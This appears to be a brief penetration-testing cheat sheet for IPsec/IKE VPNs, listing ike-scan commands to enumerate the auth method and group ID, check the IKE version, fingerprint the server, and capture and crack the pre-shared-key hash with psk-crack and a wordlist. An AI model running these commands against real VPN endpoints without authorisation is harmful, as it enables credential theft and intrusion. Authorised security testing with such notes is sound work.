
[Great Documentation](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting)

Check Auth method, ID (group name)
```bash
ike-scan --aggressive $ip
ike-scan -M $ip
```

Check IKE version
```bash
ike-scan -M -2 $ip
```

Fingerprint server
```bash
ike-scan -M --showbackoff $ip
```

If you have the ID and aggressive mode is allowed you can obtain the password hash like so
```bash
ike-scan -M -A -n <ID> --pskcrack=psk.txt $ip

psk-crack -d ~/rockyou.txt psk.txt
``` 